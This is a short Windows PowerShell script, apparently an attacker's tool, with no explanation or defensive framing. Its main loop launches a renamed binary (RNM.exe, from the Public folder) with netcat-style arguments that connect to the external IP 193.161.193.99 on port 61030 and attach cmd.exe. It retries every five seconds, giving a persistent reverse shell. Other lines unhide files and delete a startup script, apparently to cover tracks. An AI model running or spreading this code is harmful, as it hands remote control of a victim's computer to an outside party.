#taskkill /F /IM lml.exe
#C:\Users\ana\Downloads\lml.exe
attrib -h C:\Users\alooo\Downloads\lml.exe

while ($true) {
    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
    Start-Sleep -Seconds 5
}

attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1
